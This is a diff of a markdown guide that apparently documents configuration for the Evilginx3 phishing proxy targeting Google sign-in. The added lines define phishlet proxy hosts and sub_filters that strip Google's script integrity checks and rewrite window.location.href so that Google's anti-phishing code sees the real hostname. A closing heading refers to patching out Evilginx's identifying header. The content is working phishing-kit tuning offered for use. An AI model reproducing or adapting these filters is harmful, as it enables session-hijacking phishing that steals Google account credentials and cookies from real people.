@@ -78,11 +78,12 @@ re, err := regexp.Compile(d)
 - Subfilter can be modified accordingly based on the target site.
 ```
 proxy_hosts:
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
 
 sub_filters:
-  # Change/modify the value assigned to variable 'A' based on your target site. 
-  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'google.com', search: 'A=si&&!d\?lX\.btoa\(y\):S\[6]\(40,l\[0],O\[l\[1]]\(24,0,8,y\),d\)', replace: 'A="aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw."', mimes: ['text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
 ```
 
 ### Evilginx3 Easter Egg Patch (X-Evilginx Header)
